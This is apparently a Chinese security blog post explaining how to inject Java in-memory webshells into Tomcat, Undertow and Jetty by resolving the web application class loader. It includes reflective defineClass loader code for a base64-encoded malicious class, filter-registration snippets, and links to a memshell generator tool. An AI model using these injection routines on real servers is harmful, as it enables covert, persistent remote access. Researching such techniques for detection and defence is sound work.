---
title: 任意类加载环境下注入内存马
tags: [MemShell]
categories: [Java]
index_img: https://cdn.jsdelivr.net/gh/ReaJason/blog_imgs/17wanxiaoCheckInSCF_index_img.jpg
date: "2025-05-28 20:30:00"
description: "精准与否，就是屠宰与手术的区别 —— 青钢影"
---

> 常见中间件框架内存马生成平台：[MemShellParty](https://github.com/ReaJason/MemShellParty)

## 前言

在 JVM 中，每个类都有它所属的类加载器，在 Java 内存马注入场景下，我们会制作一个恶意类通过 ClassLoader.defineClass 方法注入到 JVM 中，然后通过一些特定方法注册到 Web 组件上以供我们访问。以下是 defineClass 的具体代码：

```java
private Object getShell(Object context) throws Exception {
    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    if (classLoader == null) {
        classLoader = context.getClass().getClassLoader();
    }
    try {
        return classLoader.loadClass(getClassName()).newInstance();
    } catch (Exception e) {
        byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        return clazz.newInstance();
    }
}
```

看起来非常的完善，兼容性很强的样子，先尝试获取上下文类加载器中注入，上下文类加载没有就注入到 context 的类加载器中。实际测试起来就会发现有些场景下 `context.getClass().getClassLoader()` 根本不行，而 `Thread.currentThread().getContextClassLoader()` 这种依赖请求线程，如果在非请求线程肯定是寄的，例如：[记某次实战 hessian 不出网反序列化利用](https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/) 作者为了成功打上内存马还特地找了一个有上下文类加载器的 gadget。

每个类都有我们 **想要它在** 或是 **它应该在** 的类加载器中，为了去除对 `Thread.currentThread().getContextClassLoader()` 的依赖，我一直在找寻恶意类该放置在哪个 ClassLoader 中（自我写全中间件自动化测试开始，我就察觉到了这个优化点，时不时看看但一直没找到）。

而导火索就是最近我在写 ASM 通用内存马 Agent，为了通用，我就需要将恶意类单独拆成一个类，而不是用 ASM 直接编织到指定的类上（因为用 ASM 写 Java Code 太复杂了）。最终我敲定的代码植入效果为如下：

```java
@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain){
    if(new EvilClass().equals(new Object[]{request, response, chain})){
        return;
    }   
    // other business code
}
```

期间我还尝试了如下，因为 Agent 默认会由 ClassLoader.getSystemClassLoader() 加载，所以我们可以直接指定其加载我们的恶意类，不过很遗憾的是在高版本 JDK 中部分中间件模块限制，不允许我们访问指定类，不够通用。

```java
@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain){
    if(Class.forName("org.example.EvilClass", true, ClassLoader.getSystemClassLoader()).newInstance().equals(new Object[]{request, response, chain})){
        return;
    }   
    // other business code
}
```

而就是在这个找寻通用 ASM Agent 编写方式的过程中，让我想到了一个古老的类加载问题，在这里我找到了恶意类应该去的地方。

## ApplicationFilterConfig

在 Tomcat 注入 Filter 内存马时，有时候会莫名其妙报 ClassNotFoundException 但是内存马已经能 work 了，所以在测试的时候直接跳过，我甚至猜的原因写了个可能（主打一个测试用例能通过了，其他报错都是虚无），但其实这样做不对，在测试过程中任何 warning 都应该关注（其实还有许多我当时没精力处理的 warning）。

```java
try {
    Object filterConfig = constructors[0].newInstance(context, filterDef);
    Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
    filterConfigs.put(getClassName(), filterConfig);
    System.out.println("filter inject success");
} catch (Exception e) {
    // 一个 tomcat 多个应用部分应用通过上下文线程加载 filter 对象，可能在目标应用会加载不到
    if (!(e.getCause() instanceof ClassNotFoundException)) {
        throw e;
    }
}
```

就在我去找这块报错到底是为何抛出来的时候，我发现了一切的真相。恰好我此时正在调试 Tomcat5 的环境，所以在 Tomcat5 catalina.jar 里边的 `org.apache.catalina.core.ApplicationFilterConfig#getFilter` 发现了如下代码（低版本没封装，看起来相对比较容器和直观）：

```java
// ApplicationFilterConfig
Filter getFilter() throws ClassCastException, ClassNotFoundException, IllegalAccessException, InstantiationException, ServletException {
    if (this.filter != null) {
        return this.filter;
    } else {
        String filterClass = this.filterDef.getFilterClass();
        ClassLoader classLoader = null;
        if (filterClass.startsWith("org.apache.catalina.")) {
            classLoader = this.getClass().getClassLoader();
        } else {
            classLoader = this.context.getLoader().getClassLoader();
        }

        Class clazz = classLoader.loadClass(filterClass);
        this.filter = (Filter)clazz.newInstance();
        // ...
        return this.filter;
    }
}
```

可以看到类名以 `org.apache.catalina.` 开头的由当前 class 的类加载器加载，否则使用 `context.getLoader().getClassLoader()` 进行加载，刚好这个 context 就是我们通过线程遍历拿到的 StandardContext。在高版本 Tomcat 就是稍微封装了一下，实际也是一样的，以下是高版本的代码片段。

```java
// ApplicationFilterConfig
Filter getFilter() throws ClassCastException, ClassNotFoundException, IllegalAccessException,
        InstantiationException, ServletException, InvocationTargetException, NamingException,
        IllegalArgumentException, NoSuchMethodException, SecurityException {
    if (this.filter != null)
        return this.filter;
    String filterClass = filterDef.getFilterClass();
    this.filter = (Filter) getInstanceManager().newInstance(filterClass);
    initFilter();
    return this.filter;
}

// DefaultInstanceManager
protected final ClassLoader classLoader;

public DefaultInstanceManager(Context context, Map<String,Map<String,String>> injectionMap,
            org.apache.catalina.Context catalinaContext, ClassLoader containerClassLoader) {
    classLoader = catalinaContext.getLoader().getClassLoader();
}

@Override
public Object newInstance(String className)
        throws IllegalAccessException, InvocationTargetException, NamingException, InstantiationException,
        ClassNotFoundException, IllegalArgumentException, NoSuchMethodException, SecurityException {
    // classLoader 也是通过初始化参数用的 context.getLoader().getClassLoader();
    Class<?> clazz = loadClassMaybePrivileged(className, classLoader);
    return newInstance(clazz.getConstructor().newInstance(), clazz);
}
```

看到 `context.getLoader().getClassLoader()`，很自然的就想知道它是什么时候 set 的以及具体值是什么，在 `org.apache.catalina.core.StandardContext#startInternal` 就能找到，它就是我们想找的与请求线程上下文加载器一致的 WebappLoader。

```java
@Override
protected synchronized void startInternal() throws LifecycleException {
    // ...
    if (getLoader() == null) {
        WebappLoader webappLoader = new WebappLoader(getParentClassLoader());
        webappLoader.setDelegate(getDelegate());
        setLoader(webappLoader);
    }
    // ...
}
```

我有 16 个中间件需要适配，要是这是一个特殊情况，我的适配工作恐怕有点大，不过由于这些 Java 中间件都是 Servlets 容器，我就想起了 Servlets 规范，我在 Tomcat 中找到了 `org.apache.catalina.core.ApplicationContext` 它是 ServletContext 实现类，通过查看当前类是否有 ClassLoader 相关的函数调用，找到下面这个。可以看到默认就是 `context.getLoader().getClassLoader()` 和前面一致。

```java
@Override
public ClassLoader getClassLoader() {
    ClassLoader result = context.getLoader().getClassLoader();
    if (Globals.IS_SECURITY_ENABLED) {
        ClassLoader tccl = Thread.currentThread().getContextClassLoader();
        ClassLoader parent = result;
        while (parent != null) {
            if (parent == tccl) {
                break;
            }
            parent = parent.getParent();
        }
        if (parent == null) {
            System.getSecurityManager().checkPermission(
                    new RuntimePermission("getClassLoader"));
        }
    }

    return result;
}
```

而且这个居然是 @Override 修饰的，所有肯定 Servlets 规范规定了什么东西。直接看接口文档，是获取与应用相关联的 ClassLoader，不过 Servlet 3.0 才有，意味着我的超强兼容性的内存马生成工具 [MemShellParty](https://github.com/ReaJason/MemShellParty) 指定不能直接调用了，if else 一下。

```java
// ServletContext
/**
 * Get the web application class loader associated with this ServletContext.
 *
 * @return The associated web application class loader
 *
 * @throws UnsupportedOperationException    If called from a
 *    {@link ServletContextListener#contextInitialized(ServletContextEvent)}
 *    method of a {@link ServletContextListener} that was not defined in a
 *    web.xml file, a web-fragment.xml file nor annotated with
 *    {@link javax.servlet.annotation.WebListener}. For example, a
 *    {@link ServletContextListener} defined in a TLD would not be able to
 *    use this method.
 * @throws SecurityException if access to the class loader is prevented by a
 *         SecurityManager
 * @since Servlet 3.0
 */
public ClassLoader getClassLoader();
```

## ServletContext#getClassLoader

有了这个之后，我们的内存马 defineClass 就改成了如下方式：

```java
// Servlet 高版本直接使用 getClassLoader 方法，低版本就反射调用具体方法。
private ClassLoader getWebAppClassLoader(Object context) {
    try {
        return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
    } catch (Exception e) {
        Object loader = invokeMethod(context, "getLoader", null, null);
        return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
    }
}

@SuppressWarnings("all")
private Object getShell(Object context) throws Exception {
    ClassLoader webAppClassLoader = getWebAppClassLoader(context);
    try {
        return webAppClassLoader.loadClass(getClassName()).newInstance();
    } catch (Exception e) {
        byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
        return clazz.newInstance();
    }
}
```

Undertow 在 `io.undertow.servlet.spec.ServletContextImpl#getClassLoader` 中

```java
@Override
public ClassLoader getClassLoader() {
    return getDeploymentInfo().getClassLoader();
}
```

```java
private ClassLoader getWebAppClassLoader(Object context) throws Exception {
    try {
        return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
    } catch (Exception e) {
        Object deploymentInfo = getFieldValue(context, "deploymentInfo");
        return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
    }
}
```

Jetty 在 `org.eclipse.jetty.server.handler.ContextHandler#getClassLoader` 中

```java
public ClassLoader getClassLoader()
{
    return _classLoader;
}
```

```java
public ClassLoader getWebAppClassLoader(Object context) throws Exception {
    try {
        return ((ClassLoader) invokeMethod(context, "getClassLoader"));
    } catch (Exception e) {
        return ((ClassLoader) getFieldValue(context, "_classLoader"));
    }
}
```

等等其他中间件都在 https://github.com/ReaJason/MemShellParty 中已均有实现。

## 总结

写代码的过程中，总会遇到各种各样的问题，碰到有些棘手的问题但是又有临时解决方式时我们可以加个优化 TODO，日后有时间再深入，时不时看看，灵感来了就有更好地解决办法。

我希望自己的工作是有意义的，就好比这个改动，我希望能因此适应实战中更多的漏洞场景，同时我也希望我能让 [MemShellParty](https://github.com/ReaJason/MemShellParty) 变得更有实战价值和教学意义。

护网行动在即，在 Web 漏洞层出不穷的今天，RASP 作为应用的最后一道防线，其提供了动态类加载分析、恶意类扫描、恶意类清除等功能时刻防范内存马注入和利用行为，并提供常见的 Web 漏洞防护，推荐使用 [靖云甲 RASP](https://www.boundaryx.com/category/product/adr) 加固高风险应用。
